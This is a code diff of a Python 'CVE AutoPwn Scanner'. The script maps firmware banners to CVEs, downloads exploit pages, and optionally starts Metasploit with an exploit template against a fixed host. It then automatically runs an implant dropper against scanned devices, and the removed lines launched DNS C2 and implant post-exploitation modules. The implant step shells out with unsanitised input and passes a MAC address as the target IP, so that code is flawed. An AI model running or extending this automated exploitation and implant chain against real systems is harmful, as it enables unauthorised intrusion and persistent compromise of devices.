@@ -4,131 +4,117 @@ import json
 import requests
 import subprocess
 from datetime import datetime
+from pathlib import Path
+import argparse
+import threading
 
-firmware_strings = ['busybox v1.20.2', 'lighttpd/1.4.31']
-known_vulns = {
-    'busybox v1.20.2': {
-        'cve': 'CVE-2013-1813',
-        'summary': 'BusyBox wget allows arbitrary file overwrite',
-        'severity': 'High',
-        'exploit_links': {
-            'exploitdb': 'https://www.exploit-db.com/exploits/26700',
-            'packetstorm': 'https://packetstormsecurity.com/files/120420'
-        }
-    },
-    'lighttpd/1.4.31': {
-        'cve': 'CVE-2014-2323',
-        'summary': 'Lighttpd mod_userdir local file disclosure',
-        'severity': 'Medium',
-        'exploit_links': {
-            'exploitdb': 'https://www.exploit-db.com/exploits/32742',
-            'packetstorm': 'https://packetstormsecurity.com/files/126068'
-        }
-    }
+FIRMWARE_STRINGS = ['busybox v1.20.2', 'lighttpd/1.4.31']
+KNOWN_VULNS = {
+    'busybox v1.20.2': 'CVE-2013-1813',
+    'lighttpd/1.4.31': 'CVE-2014-2323'
 }
 
-RESULTS_DIR = "results"
-POC_DIR = os.path.join(RESULTS_DIR, "pocs")
-MSF_XML_DIR = os.path.join(RESULTS_DIR, "msf_search")
-KILLCHAIN_FILE = "reports/killchain.txt"
-CVE_AUTOPWN_JSON = os.path.join(RESULTS_DIR, "cve_autopwn.json")
-POST_MODULES = ["modules/payloads/dns_c2.py", "modules/payloads/implant_dropper.py"]
+NVD_API_KEY = os.getenv("NVD_API_KEY", "DEMO_KEY")
+EXPLOIT_DB_SEARCH = "https://www.exploit-db.com/search?q="
 
-def check_write(path):
-    try:
-        os.makedirs(path, exist_ok=True)
-        testfile = os.path.join(path, ".__testwrite__")
-        with open(testfile, "w") as f:
-            f.write("test")
-        os.remove(testfile)
-        return True
-    except:
-        return False
+KILLCHAIN_PATH = "reports/killchain.json"
+ALERT_PUSH_URL = "ws://localhost:8765"
+CACHE_FOLDER = "results/pocs"
+ASSETS_FILE = "results/wifi_scan.json"
 
-def launch_post_modules():
-    for module in POST_MODULES:
-        if os.path.exists(module):
+Path("results").mkdir(exist_ok=True)
+Path("reports").mkdir(exist_ok=True)
+Path(CACHE_FOLDER).mkdir(exist_ok=True)
+
+parser = argparse.ArgumentParser(description="CVE AutoPwn Scanner")
+parser.add_argument('--msf', action='store_true', help="Launch Metasploit CLI automatically")
+args = parser.parse_args()
+
+print("[*] Scanning for firmware-based vulnerabilities...")
+
+alerts = []
+timeline_updates = []
+
+for comp in FIRMWARE_STRINGS:
+    if comp in KNOWN_VULNS:
+        cve = KNOWN_VULNS[comp]
+        print(f"[!] Found vulnerable component: {comp} => {cve}")
+        print(f"    Searching ExploitDB: {EXPLOIT_DB_SEARCH}{cve}")
+
+        # Try PoC auto-download
+        poc_file = os.path.join(CACHE_FOLDER, f"{cve}.txt")
+        if not os.path.exists(poc_file):
             try:
-                subprocess.Popen(["python3", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                print(f"[+] Post-ex module launched: {module}")
+                r = requests.get(EXPLOIT_DB_SEARCH + cve)
+                with open(poc_file, "w") as f:
+                    f.write(r.text[:3000])  # Save snippet
+                print(f"[+] PoC cached: {poc_file}")
             except:
-                pass
+                print(f"[!] Failed to download PoC for {cve}")
+        else:
+            print(f"[=] PoC already cached: {poc_file}")
 
-def launch_metasploit(cve_id):
-    msf_cmd = f"search {cve_id}"
-    try:
-        print(f"[>] Launching Metasploit for CVE: {cve_id}")
-        subprocess.call(["msfconsole", "-q", "-x", f"{msf_cmd}; exit"])
-    except:
-        print(f"[!] Metasploit launch failed for {cve_id}")
-
-if not check_write(RESULTS_DIR) or not check_write("reports"):
-    print("[!] Check write permissions on results/ and reports/")
-    exit(1)
-
-os.makedirs(POC_DIR, exist_ok=True)
-os.makedirs(MSF_XML_DIR, exist_ok=True)
-os.makedirs("reports", exist_ok=True)
-
-matched = []
-print(" CVE AutoPwn Scanner Running...")
-
-for comp in firmware_strings:
-    if comp in known_vulns:
-        vuln = known_vulns[comp]
-        cve_id = vuln['cve']
-        print(f"[!] Found vulnerable component: {comp} => {cve_id}")
-        print(f"    Suggested PoC: {vuln['exploit_links']['exploitdb']}")
-
-        for label, url in vuln['exploit_links'].items():
-            try:
-                resp = requests.get(url, timeout=10)
-                poc_path = os.path.join(POC_DIR, f"{cve_id}_{label}.html")
-                with open(poc_path, "w") as f:
-                    f.write(resp.text)
-                print(f"    [+] Saved PoC: {poc_path}")
-            except:
-                print(f"    [!] Failed to download {label} PoC")
-
-        try:
-            xml_path = os.path.join(MSF_XML_DIR, f"{cve_id}_search.xml")
-            with open(xml_path, "w") as f:
-                f.write(f"<metasploit><search><cve>{cve_id}</cve><result>placeholder</result></search></metasploit>")
-            print(f"    [+] Metasploit XML created: {xml_path}")
-        except:
-            print(f"    [!] Failed to write XML")
-
-        try:
-            with open(KILLCHAIN_FILE, "a") as f:
-                f.write(f"\n[+] CVE AutoPwn Enrichment - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write(f"-> Component: {comp}\n")
-                f.write(f"   - CVE: {cve_id}\n")
-                f.write(f"   - Severity: {vuln['severity']}\n")
-                f.write(f"   - Summary: {vuln['summary']}\n")
-                for label, url in vuln['exploit_links'].items():
-                    f.write(f"   - {label.upper()} PoC: {url}\n")
-                f.write(f"   - Metasploit XML: {xml_path}\n")
-        except:
-            print(f"    [!] Killchain update failed")
-
-        matched.append({
+        # Timeline update
+        timeline_updates.append({
+            "stage": "Exploitation",
+            "cve": cve,
+            "timestamp": datetime.now().isoformat(),
             "component": comp,
-            "cve": cve_id,
-            "summary": vuln['summary'],
-            "severity": vuln['severity'],
-            "exploit_links": vuln['exploit_links']
+            "poc": poc_file
         })
 
-        choice = input(f"    [>] Launch Metasploit for {cve_id}? (y/n): ").strip().lower()
-        if choice == 'y':
-            launch_metasploit(cve_id)
+        # Push to dashboard agent feed
+        alerts.append({
+            "type": "cve_alert",
+            "cve": cve,
+            "component": comp,
+            "severity": "high",
+            "tags": ["autopwn", "exploit"],
+            "timestamp": datetime.now().isoformat()
+        })
 
-try:
-    with open(CVE_AUTOPWN_JSON, "w") as f:
-        json.dump(matched, f, indent=2)
-    print(f"\n[+] Match data saved to {CVE_AUTOPWN_JSON}")
-except:
-    print(f"[!] Failed to write CVE match JSON")
+        # Metasploit launch (optional)
+        if args.msf:
+            msf_command = f"use exploit/linux/http/{cve.lower().replace('-', '_')}\nset RHOST 192.168.1.100\nrun\n"
+            print("[+] Launching Metasploit with template (non-interactive)...")
+            subprocess.Popen(['msfconsole', '-q', '-x', msf_command])
 
-print("\n[>] Launching post-ex modules...")
-launch_post_modules()
+# Save killchain timeline
+if os.path.exists(KILLCHAIN_PATH):
+    with open(KILLCHAIN_PATH) as f:
+        killchain = json.load(f)
+else:
+    killchain = {"generated": datetime.now().isoformat(), "events": []}
+
+killchain["events"].extend(timeline_updates)
+with open(KILLCHAIN_PATH, "w") as f:
+    json.dump(killchain, f, indent=2)
+
+print(f"[+] Kill chain timeline updated: {KILLCHAIN_PATH}")
+
+# Push alerts to agents
+def push_alerts():
+    try:
+        import websocket
+        ws = websocket.create_connection(ALERT_PUSH_URL)
+        for alert in alerts:
+            ws.send(json.dumps(alert))
+        ws.close()
+        print("[+] Alerts pushed to dashboard.")
+    except Exception as e:
+        print(f"[!] Dashboard push failed: {e}")
+
+threading.Thread(target=push_alerts).start()
+
+# Auto-trigger implants on matching devices
+if os.path.exists(ASSETS_FILE):
+    try:
+        with open(ASSETS_FILE) as f:
+            wifi_data = json.load(f)
+            for dev in wifi_data:
+                if "mqtt" in dev.get("SSID", "").lower():
+                    ip = dev.get("BSSID", "unknown")
+                    print(f"[>] Auto-triggering implant on {ip}...")
+                    os.system(f"python3 modules/payloads/implant_dropper.py --target {ip}")
+    except:
+        print("[!] Could not auto-trigger implants from wifi_scan.json")
